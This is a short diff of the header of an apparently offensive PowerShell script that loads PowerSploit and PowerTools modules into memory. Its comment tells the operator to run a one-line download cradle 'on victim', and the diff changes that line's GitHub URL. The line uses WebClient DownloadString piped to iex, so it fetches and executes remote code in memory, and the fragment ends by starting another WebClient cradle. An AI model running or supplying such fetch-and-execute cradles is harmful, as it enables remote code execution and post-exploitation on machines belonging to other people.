@@ -2,7 +2,7 @@
 =====================================================================================
 Most Useful PowerSploit and PowerTools Modules that can be loaded into memory
 Use this line in PowerShell on victim to pull into memory the modules
-(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/davehardy20/PowerShell-Scripts/master/in-memory-downloader.ps1')|iex
+(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/nettitude/powershell/master/in-memory-downloader.ps1')|iex
 =====================================================================================
 #>
 $downloadcradle = New-Object Net.WebClient
